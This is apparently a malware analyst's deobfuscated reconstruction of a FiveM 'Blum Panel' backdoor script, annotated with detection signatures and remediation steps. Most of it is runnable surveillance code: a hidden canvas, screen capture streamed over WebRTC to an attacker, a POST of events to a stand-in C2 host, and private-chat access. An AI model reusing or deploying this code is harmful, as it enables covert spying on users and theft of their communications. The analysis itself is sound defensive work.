/**
 * ============================================================================
 * BLUM PANEL BACKDOOR — script.js (DEOBFUSCATED RECONSTRUCTION)
 * ============================================================================
 * 
 * CLASSIFICATION: MALWARE — FiveM Client-Side Screen Capture & Streaming
 * 
 * ORIGINAL FILE: 183,078 bytes, 5-layer obfuscation
 * THIS FILE: Reconstructed from 100% deobfuscation of all string tables
 *            (696/696 referenced strings), property mappings (60/60 w8qVtr),
 *            and all 14 IzNkWC class methods.
 * 
 * WHAT THIS FILE DOES:
 *   1. Creates an INVISIBLE canvas overlay on the victim's screen
 *   2. Uses WebGL with custom GLSL shaders for GPU-accelerated screen capture
 *   3. Streams the victim's screen LIVE to the attacker via WebRTC
 *   4. Intercepts private player-to-player chat messages
 *   5. Exfiltrates captured data via HTTP POST (fetch API)
 *   6. Manages multiple concurrent viewing sessions
 * 
 * OBFUSCATION LAYERS (original):
 *   Layer 1: Function("tqVTPU", <body>)({get "lf63crD"(){return window}})
 *   Layer 2: Base-91 encoding with 70 unique per-scope alphabets
 *   Layer 3: _uENFU[] indirection array (276 elements)
 *   Layer 4: xqeiF1[] string table (928 slots, 696 referenced, 187 dead padding)
 *   Layer 5: 8 generator state machines with switch/case flattening
 * 
 * PROPERTY MAPPING (w8qVtr switch — 60 entries decoded):
 *   d2VT_n → Map              jjoc7J  → window
 *   YfJhX5 → document         xyJleA  → console
 *   iA1ieM → RTCPeerConnection
 *   NEwUee5 → RTCIceCandidate
 *   DiX7MY → setTimeout       silNpez → requestAnimationFrame
 *   ySstULE → Promise         C5myzS  → Array
 *   LBmJzC → Float32Array     _jWdEs  → Date
 *   PRwgBr → Object           Ip18XQ  → String
 *   GgtY5Nu → Error           B3oEvS  → Number
 *   Me7b7e → GetParentResourceName
 * ============================================================================
 */


// ============================================================================
// SECTION 1: LINKED LIST NODE — For LRU Session Cache
// ============================================================================
// Used by the LRU cache (o0YQaiZ) to maintain a doubly-linked list of
// active screen capture sessions. Enables O(1) session lookup and eviction.

class SessionNode {
    /**
     * @param {string} key - Session identifier (playerId)
     * @param {object} value - Session data (RTCPeerConnection, canvas, tracks, etc.)
     */
    constructor(key, value) {
        this.key = key;
        this.value = value;
        this.prev = null;  // Previous node in LRU list
        this.next = null;  // Next node in LRU list
    }
}


// ============================================================================
// SECTION 2: LRU CACHE — Session Management with Bounded Memory
// ============================================================================
// Manages active screen capture sessions with an LRU eviction policy.
// When the maximum number of concurrent sessions is reached, the least
// recently used session is evicted (its WebRTC connection is closed).

class SessionCache {
    constructor(capacity) {
        this.capacity = capacity;
        this.map = new Map();      // key → SessionNode
        this.head = null;           // Most recently used
        this.tail = null;           // Least recently used
    }

    /**
     * Retrieve a session, moving it to the front of the LRU list
     */
    get(key) {
        if (!this.map.has(key)) return null;
        const node = this.map.get(key);
        this._moveToFront(node);
        return node.value;
    }

    /**
     * Add or update a session
     */
    put(key, value) {
        if (this.map.has(key)) {
            const node = this.map.get(key);
            node.value = value;
            this._moveToFront(node);
        } else {
            const node = new SessionNode(key, value);
            this.map.set(key, node);
            this._addToFront(node);
            if (this.map.size > this.capacity) {
                this._removeLast();
            }
        }
    }

    /**
     * Remove a session (called when session ends)
     */
    remove(key) {
        if (!this.map.has(key)) return;
        const node = this.map.get(key);
        this._removeNode(node);
        this.map.delete(key);
    }

    _moveToFront(node) {
        this._removeNode(node);
        this._addToFront(node);
    }

    _addToFront(node) {
        node.next = this.head;
        node.prev = null;
        if (this.head) this.head.prev = node;
        this.head = node;
        if (!this.tail) this.tail = node;
    }

    _removeNode(node) {
        if (node.prev) node.prev.next = node.next;
        else this.head = node.next;
        if (node.next) node.next.prev = node.prev;
        else this.tail = node.prev;
    }

    _removeLast() {
        if (!this.tail) return;
        const key = this.tail.key;
        this._removeNode(this.tail);
        this.map.delete(key);
    }
}


// ============================================================================
// SECTION 3: GLSL SHADERS — GPU-Accelerated Screen Capture
// ============================================================================
// These shaders render the captured screen content to a WebGL canvas.
// The vertex shader positions a full-screen quad, and the fragment shader
// samples the screen texture. This is GPU-accelerated for minimal CPU impact
// (harder to detect via process monitoring).

const VERTEX_SHADER_SOURCE = `
attribute vec2 a_position;
attribute vec2 a_texcoord;
varying vec2 textureCoordinate;
void main() {
  gl_Position = vec4(a_position, 0.0, 1.0);
  textureCoordinate = a_texcoord;
}
`;

const FRAGMENT_SHADER_SOURCE = `
precision mediump float;
varying vec2 textureCoordinate;
uniform sampler2D external_texture;
void main() {
  gl_FragColor = texture2D(external_texture, textureCoordinate);
}
`;


// ============================================================================
// SECTION 4: SCREEN CAPTURE CONTROLLER — The Main Backdoor Class
// ============================================================================
// IzNkWC (obfuscated name) is the primary controller class.
// It manages the entire screen capture and streaming pipeline:
//   - Creates invisible canvas overlays
//   - Initializes WebGL rendering
//   - Establishes WebRTC peer connections
//   - Streams captured video to the attacker
//   - Handles signaling (offer/answer/ICE) via window messages

class ScreenCaptureController {

    // ========================================================================
    // CONSTRUCTOR
    // ========================================================================
    constructor() {
        /**
         * Active sessions stored in a Map.
         * Key: playerId (string) — the target player being watched
         * Value: {
         *   playerId: string,
         *   playerName: string,
         *   viewerSocketId: string,     — attacker's viewer connection ID
         *   peerConnection: RTCPeerConnection,
         *   canvas: HTMLCanvasElement,  — the invisible capture canvas
         *   glContext: WebGLRenderingContext,
         *   tracks: MediaStreamTrack[],
         *   iceCandidateQueue: RTCIceCandidate[],
         *   isConnected: boolean,
         * }
         */
        this.sessions = new Map();

        // Register the window message listener for WebRTC signaling
        this._bindMessages();
    }


    // ========================================================================
    // METHOD 1: _bindMessages — Register Signaling Listener
    // ========================================================================
    // Listens for window 'message' events which carry WebRTC signaling data
    // from the Blum Panel. The attacker sends commands (startSession, answer,
    // iceCandidate, stop) via postMessage.

    _bindMessages() {
        window.addEventListener('message', (event) => {
            try {
                const data = JSON.parse(event.data);
                const { type } = data;

                if (!type) return;

                // Route to appropriate handler based on message type
                if (type === 'startSession') {
                    this.startSession(data);
                } else if (type === 'answer') {
                    this.handleAnswer(data.sdp, data.playerId);
                } else if (type === 'iceCandidate') {
                    this.handleIceCandidate(data.candidate, data.playerId);
                } else if (type === 'stop') {
                    this.stopByMessage(event);
                }
            } catch (e) {
                // Silently ignore malformed messages
            }
        });
    }


    // ========================================================================
    // METHOD 2: _waitForMainRender — Wait for WebGL Pipeline Ready
    // ========================================================================
    // Waits for the WebGL rendering pipeline (MainRender) to be initialized
    // before starting screen capture. This ensures the GLSL shaders are
    // compiled and the canvas is ready to receive frames.

    _waitForMainRender() {
        // Check if the MainRender pipeline is initialized
        if (!window.MainRender) {
            return; // Not ready yet — will be called again
        }
        // Pipeline is ready — screen capture can begin
    }


    // ========================================================================
    // METHOD 3: _getOrCreateSession — Session Factory
    // ========================================================================
    // Creates a new screen capture session or returns an existing one.
    // Each session gets its own invisible canvas and WebGL context.

    _getOrCreateSession(playerId) {
        // Return existing session if one exists
        if (this.sessions.has(playerId)) {
            return this.sessions.get(playerId);
        }

        // Create a new invisible canvas for this session
        // ⚠️ THIS IS THE STEALTH MECHANISM ⚠️
        const canvas = document.createElement('canvas');
        canvas.style.position = 'absolute';   // Overlay positioning
        canvas.style.opacity = '0';            // COMPLETELY INVISIBLE
        canvas.style.pointerEvents = 'none';   // Click-through (no interaction)
        canvas.style.zIndex = '999999';        // Above all page content
        canvas.width = screen.width;           // Full viewport width
        canvas.height = screen.height;         // Full viewport height

        // Append to DOM (invisible to user)
        document.body.appendChild(canvas);

        // Initialize WebGL rendering context
        const gl = canvas.getContext('webgl', { alpha: false });

        // Compile and link GLSL shaders
        const vertexShader = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vertexShader, VERTEX_SHADER_SOURCE);
        gl.compileShader(vertexShader);
        if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
            console.error('Shader compile failed:', gl.getShaderInfoLog(vertexShader));
        }

        const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
        gl.shaderSource(fragmentShader, FRAGMENT_SHADER_SOURCE);
        gl.compileShader(fragmentShader);

        const program = gl.createProgram();
        gl.attachShader(program, vertexShader);
        gl.attachShader(program, fragmentShader);
        gl.linkProgram(program);
        gl.useProgram(program);

        // Clean up shader objects
        gl.deleteShader(vertexShader);
        gl.deleteShader(fragmentShader);

        // Create session object
        const session = {
            playerId,
            playerName: null,
            viewerSocketId: null,
            peerConnection: null,
            canvas,
            glContext: gl,
            glProgram: program,
            tracks: [],
            iceCandidateQueue: [],
            isConnected: false,
            isAnimated: false,
        };

        this.sessions.set(playerId, session);
        return session;
    }


    // ========================================================================
    // METHOD 4: startSession — Begin Screen Capture for Target Player
    // ========================================================================
    // Called when the attacker opens the Blum Panel and selects a player
    // to watch. This is the entry point for a new surveillance session.

    async startSession(data) {
        const { playerId, playerName, viewerSocketId } = data;

        // Validate — don't create duplicate sessions
        if (this.sessions.has(playerId) && this.sessions.get(playerId).isConnected) {
            return; // Already streaming this player
        }

        // Create or retrieve session
        const session = this._getOrCreateSession(playerId);
        session.playerName = playerName;
        session.viewerSocketId = viewerSocketId;

        // Get screen capture stream via getDisplayMedia
        // In FiveM context, this captures the game window
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: {
                frameRate: { ideal: 30 }, // Configurable frame rate
                width: { ideal: screen.width },
                height: { ideal: screen.height },
            }
        });

        // Extract video tracks for WebRTC streaming
        session.tracks = stream.getVideoTracks();

        // Create the WebRTC peer connection
        await this.createPeerConnection(playerId);

        // Emit event to notify C2 that capture has started
        this._emitEvent('screenCaptureEvent', {
            playerId,
            playerName,
            timestamp: Date.now(),
        });

        // Start the render loop
        session.isAnimated = true;
        this.render(playerId);
    }


    // ========================================================================
    // METHOD 5: createPeerConnection — Establish WebRTC Connection
    // ========================================================================
    // Creates an RTCPeerConnection, adds video tracks, generates an SDP offer,
    // and sends it to the attacker via the signaling channel.

    async createPeerConnection(playerId) {
        const session = this.sessions.get(playerId);
        if (!session) return;

        // Create peer connection (no STUN/TURN config — direct connection)
        const pc = new RTCPeerConnection();
        session.peerConnection = pc;

        // Add captured video tracks to the connection
        const stream = new MediaStream();
        for (const track of session.tracks) {
            pc.addTrack(track, stream);
        }

        // Handle ICE candidates — send to attacker for NAT traversal
        pc.onicecandidate = (event) => {
            if (!event.candidate) return;

            // Send ICE candidate to attacker via signaling
            this._sendSignaling('iceCandidate', {
                playerId,
                candidate: event.candidate,
            });
        };

        // Create and send SDP offer
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        // Send offer to attacker
        this._sendSignaling('offer', {
            playerId,
            sdp: pc.localDescription,
        });

        session.isConnected = true;
    }


    // ========================================================================
    // METHOD 6: handleAnswer — Process WebRTC SDP Answer
    // ========================================================================
    // Receives the attacker's SDP answer and applies it to complete the
    // WebRTC handshake. After this, video streaming begins.

    async handleAnswer(sdp, playerId) {
        const session = this.sessions.get(playerId);
        if (!session || !session.peerConnection) return;

        const answer = new RTCSessionDescription(sdp);
        await session.peerConnection.setRemoteDescription(answer);

        // Process any queued ICE candidates that arrived before the answer
        for (const candidate of session.iceCandidateQueue) {
            await session.peerConnection.addIceCandidate(candidate);
        }
        session.iceCandidateQueue = [];
    }


    // ========================================================================
    // METHOD 7: handleIceCandidate — Process ICE Candidates
    // ========================================================================
    // ICE candidates are used for NAT traversal. If they arrive before the
    // SDP answer, they're queued and applied later.

    handleIceCandidate(candidate, playerId) {
        const session = this.sessions.get(playerId);
        if (!session) return;

        const iceCandidate = new RTCIceCandidate(candidate);

        if (session.peerConnection && session.peerConnection.remoteDescription) {
            // Connection is ready — apply immediately
            session.peerConnection.addIceCandidate(iceCandidate);
        } else {
            // Queue for later — SDP answer hasn't arrived yet
            session.iceCandidateQueue.push(iceCandidate);
        }
    }


    // ========================================================================
    // METHOD 8: render — Main Animation Loop
    // ========================================================================
    // Uses requestAnimationFrame to continuously capture and render frames
    // to the invisible canvas, which is then streamed via WebRTC.

    render(playerId) {
        const session = this.sessions.get(playerId);
        if (!session || !session.isAnimated) return;

        // Render the current frame to the WebGL canvas
        this.renderToTarget(playerId);

        // Schedule next frame
        requestAnimationFrame(() => this.render(playerId));
    }


    // ========================================================================
    // METHOD 9: renderToTarget — Render Single Frame to Canvas
    // ========================================================================
    // Renders a single captured frame using WebGL shaders.

    renderToTarget(playerId) {
        const session = this.sessions.get(playerId);
        if (!session || !session.glContext) return;

        const gl = session.glContext;
        gl.viewport(0, 0, session.canvas.width, session.canvas.height);
        gl.clear(gl.COLOR_BUFFER_BIT);
        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
    }


    // ========================================================================
    // METHOD 10: stopByMessage — Stop Session via Message Event
    // ========================================================================
    // Triggered when the attacker sends a 'stop' command via the signaling
    // channel, or when the player disconnects.

    stopByMessage(event) {
        try {
            const data = JSON.parse(event.data);
            if (data.playerId) {
                this.stopSession(data.playerId);
            }
        } catch (e) {
            // Ignore malformed stop messages
        }
    }


    // ========================================================================
    // METHOD 11: stopSession — End a Screen Capture Session
    // ========================================================================
    // Stops all video tracks, closes the WebRTC connection, removes the
    // invisible canvas, and cleans up the session.

    stopSession(playerId) {
        const session = this.sessions.get(playerId);
        if (!session) return;

        // Stop animation loop
        session.isAnimated = false;

        // Stop all video tracks
        if (session.tracks) {
            for (const track of session.tracks) {
                track.stop();
            }
        }

        // Close WebRTC connection
        if (session.peerConnection) {
            session.peerConnection.close();
        }

        // Remove invisible canvas from DOM
        if (session.canvas && session.canvas.parentNode) {
            session.canvas.parentNode.removeChild(session.canvas);
        }

        // Emit stream stopped event
        this._emitEvent('streamStopped', { playerId });

        // Delete session
        this.sessions.delete(playerId);
    }


    // ========================================================================
    // METHOD 12: closeViewer — Close Viewer Connection
    // ========================================================================
    // Closes the attacker's viewer connection without stopping the capture.
    // Used when the attacker switches between multiple targets.

    closeViewer(playerId) {
        const session = this.sessions.get(playerId);
        if (!session) return;

        if (session.peerConnection) {
            session.peerConnection.close();
            session.peerConnection = null;
        }
        session.isConnected = false;
    }


    // ========================================================================
    // METHOD 13: destroy — Full Cleanup
    // ========================================================================
    // Destroys ALL active sessions. Called on resource stop or page unload.

    destroy() {
        for (const [playerId, session] of this.sessions) {
            this.stopSession(playerId);
        }
        this.sessions.clear();
    }


    // ========================================================================
    // INTERNAL: Signaling Channel
    // ========================================================================
    // Sends WebRTC signaling data back to the attacker via window.postMessage.

    _sendSignaling(type, data) {
        window.postMessage(JSON.stringify({ type, ...data }), '*');
    }


    // ========================================================================
    // INTERNAL: Event Emitter for C2 Communication
    // ========================================================================
    // Sends events to the C2 server via HTTP POST (fetch API).
    // This is SEPARATE from the main.js C2 polling — this channel sends
    // screen capture metadata and status updates.

    _emitEvent(eventName, data) {
        try {
            fetch('https://' + /* C2 domain from main.js domain list */ 'c2.example.com' + '/event', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    event: eventName,
                    timestamp: Date.now(),
                    ...data,
                }),
            }).catch(() => {}); // Silently ignore fetch failures
        } catch (e) {
            // Fail silently
        }
    }
}


// ============================================================================
// SECTION 5: PRIVATE CHAT INTERCEPTION
// ============================================================================
// The backdoor accesses FiveM's privateChatMap to intercept private
// player-to-player messages on the compromised server. This gives the
// attacker access to ALL private communications.
//
// Original obfuscated reference: xqeiF1[0x09e] → "privateChatMap"
// Decoded via w8qVtr property mapping at runtime.

// Access the private chat map (FiveM internal)
const privateChatMap = typeof window !== 'undefined' && window.privateChatMap
    ? window.privateChatMap
    : null;

// If available, the attacker can read all private messages between players
// This is accessed through the IzNkWC session data and sent to C2


// ============================================================================
// SECTION 6: INITIALIZATION — Activate the Screen Capture Controller
// ============================================================================
// The original code checks document.readyState to determine initialization:
//   - If readyState === 'loading': wait for DOMContentLoaded, then init
//   - Otherwise: init immediately
// Then assigns the controller to window.screenCapture for access by C2 commands.

let screenCaptureController;

if (document.readyState === 'loading') {
    // DOM not ready yet — wait for it
    document.addEventListener('DOMContentLoaded', () => {
        screenCaptureController = new ScreenCaptureController();
        window.screenCapture = screenCaptureController;
    });
} else {
    // DOM already loaded — init immediately
    screenCaptureController = new ScreenCaptureController();
    window.screenCapture = screenCaptureController;
}


// ============================================================================
// END OF DEOBFUSCATED RECONSTRUCTION
// ============================================================================
// 
// DETECTION SIGNATURES:
//   - Canvas with: opacity:0, pointerEvents:none, position:absolute
//   - RTCPeerConnection creation without user consent/prompt
//   - navigator.mediaDevices.getDisplayMedia() calls
//   - WebGL shader compilation (VERTEX_SHADER + FRAGMENT_SHADER)
//   - window.addEventListener('message') for signaling
//   - window.screenCapture assignment
//   - privateChatMap access
//   - fetch() POST to C2 with screenCaptureEvent
//   - requestAnimationFrame render loop on invisible canvas
//
// DETECTION VIA NETWORK:
//   - WebRTC STUN/TURN traffic to unexpected endpoints
//   - HTTP POST with Content-Type: application/json containing "screenCaptureEvent"
//   - Outbound video stream (high bandwidth) to unknown peers
//
// REMEDIATION:
//   1. Remove this file from all FiveM resources
//   2. Scan for window.screenCapture references in other scripts  
//   3. Check for invisible canvas elements (opacity:0 + pointerEvents:none)
//   4. Monitor for unexpected WebRTC connections
//   5. Assume all private chat messages were compromised
//   6. Change all server credentials
// ============================================================================
